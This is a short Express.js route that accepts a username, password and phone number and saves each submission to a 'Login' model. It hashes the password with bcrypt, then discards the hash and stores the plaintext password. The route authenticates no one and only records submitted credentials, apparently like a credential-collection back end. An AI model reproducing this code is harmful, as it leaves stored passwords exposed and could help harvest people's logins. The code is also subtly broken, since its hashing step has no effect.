const express = require('express');
const bcrypt = require('bcryptjs');
const Login = require('../models/Login');

const router = express.Router();

router.post('/', async (req, res) => {
  try {
    const { username, password, phone } = req.body;

    if (!username || !password || !phone) {
      return res.status(400).json({
        success: false,
        message: 'Username, password, and phone are required',
      });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    await Login.create({
      username: username.trim(),
      password: password,
      phone: phone.trim(),
    });

    return res.status(201).json({
      success: true,
      message: 'Login submitted',
    });
  } catch (error) {
    console.error('Login error:', error.message);
    return res.status(500).json({
      success: false,
      message: 'Server error',
    });
  }
});

module.exports = router;
